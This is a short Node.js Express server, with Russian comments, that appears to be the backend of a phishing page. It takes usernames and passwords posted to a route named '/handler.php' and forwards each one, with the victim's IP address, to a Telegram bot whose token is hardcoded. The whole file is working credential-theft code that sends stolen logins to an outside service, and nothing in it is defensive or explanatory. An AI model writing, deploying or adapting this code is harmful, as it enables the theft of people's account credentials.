const express = require('express');
const axios = require('axios');
const app = express();
const PORT = 3000;

// Настройки Telegram (используем ваш новый токен)
const BOT_TOKEN = '8227258909:AAHCddLIKhZrj4I0F68WOn7D4owaVTUDmpQ';
const CHAT_ID = '8227258909';

// Middleware для работы с JSON (аналог json_decode в PHP)
app.use(express.json());
app.use(express.static('public')); // Чтобы отдавать ваш HTML файл

app.post('/handler.php', async (req, res) => {
    const { username, password } = req.body;

    // Проверка наличия данных
    if (!username || !password) {
        return res.status(400).json({ error: 'Missing data' });
    }

    // Получаем IP адрес (аналог $_SERVER['REMOTE_ADDR'])
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

    // Формируем текст сообщения
    const message = `🔐 *Neuer Login (Node.js)*\n\n` +
                    `👤 *User:* ${username}\n` +
                    `🔑 *Pass:* ${password}\n` +
                    `🌍 *IP:* ${ip}`;

    try {
        // Отправка в Telegram через axios
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown' // Чтобы текст был красивым (жирным)
        });

        console.log(`Данные пользователя ${username} отправлены в Telegram.`);
        res.json({ success: true });
    } catch (error) {
        console.error('Ошибка отправки в Telegram:', error.message);
        res.status(500).json({ error: 'Server error' });
    }
});

app.listen(PORT, () => {
    console.log(`Сервер запущен: http://localhost:${PORT}`);
});